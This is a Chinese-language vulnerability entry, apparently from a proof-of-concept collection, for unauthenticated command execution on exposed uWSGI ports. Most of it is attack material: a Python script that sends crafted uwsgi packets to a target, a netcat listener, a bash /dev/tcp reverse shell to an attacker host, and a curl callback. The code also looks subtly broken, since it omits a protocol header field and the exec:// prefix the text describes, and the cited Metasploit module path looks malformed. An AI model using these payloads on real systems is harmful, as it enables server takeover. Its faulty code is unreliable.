---
id: UWSGI-UNACC
title: uWSGI 未授权访问漏洞
product: uwsgi
vendor: uWSGI
version_affected: "全版本"
severity: HIGH
tags: [rce, 无需认证]
fingerprint: ["uWSGI", "uwsgi"]
---

## 漏洞描述

uWSGI 支持通过魔术变量（Magic Variables）的方式动态配置后端 Web 应用。如果其端口暴露在外，攻击者可以构造 uwsgi 数据包，并指定魔术变量 `UWSGI_FILE`，运用 `exec://` 协议执行任意命令。

## 影响版本

- 全版本（未配置认证时）

## 前置条件

- 无需认证
- uwsgi 端口暴露在外（默认 8000）

## 利用步骤

1. 使用脚本构造 uwsgi 数据包
2. 利用 `UWSGI_FILE` 魔术变量执行命令

## Payload

```python
# 内联POC - uWSGI 未授权访问 RCE
import socket
import struct

def build_uwsgi_packet(command):
    """构造uWSGI数据包"""
    # uwsgi协议头
    packet = b'\x00'  # modifier1
    packet += b'\x00'  # reserved

    # UWSGI_FILE 魔术变量
    key = b'UWSGI_FILE'
    packet += struct.pack('!H', len(key)) + key
    packet += struct.pack('!H', len(command)) + command.encode()

    # 协议结尾
    packet += b'\x00\x00'

    return packet

def exploit_uwsgi(target_ip, port, command):
    """发送uWSGI数据包执行命令"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect((target_ip, port))

    packet = build_uwsgi_packet(command)
    s.send(packet)
    resp = s.recv(4096)
    print(f"[+] Response: {resp[:100]}")
    s.close()

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} <target_ip> <port> <command>")
        print(f"Example: {sys.argv[0]} target 8000 'touch /tmp/success'")
        sys.exit(1)

    exploit_uwsgi(sys.argv[1], int(sys.argv[2]), sys.argv[3])
```

```bash
# 或使用https://github.com/0xInfection/uwsgi-exploit等工具
# 建议使用metasploit模块: use exploit/linux/iisc/_uwsgi_rce_condor
```

## 验证方法

```bash
# 此漏洞为RCE via uWSGI，需要使用反弹shell或HTTP外带验证
# 攻击者服务器启动监听
nc -lvp 4444

# 发送反弹shell命令
python3 uwsgi_exploit.py target 8000 "bash -i >& /dev/tcp/attacker-ip/4444 0>&1"

# 或使用HTTP外带验证（推荐，攻击者服务器启动: python3 -m http.server 8080）
python3 uwsgi_exploit.py target 8000 "curl http://attacker-ip:8080/whoami"
# 检查HTTP服务器日志是否有回连
```

## 修复建议

1. 配置 uwsgi 认证
2. 限制 uwsgi 端口访问来源
3. 使用防火墙保护 uwsgi 端口
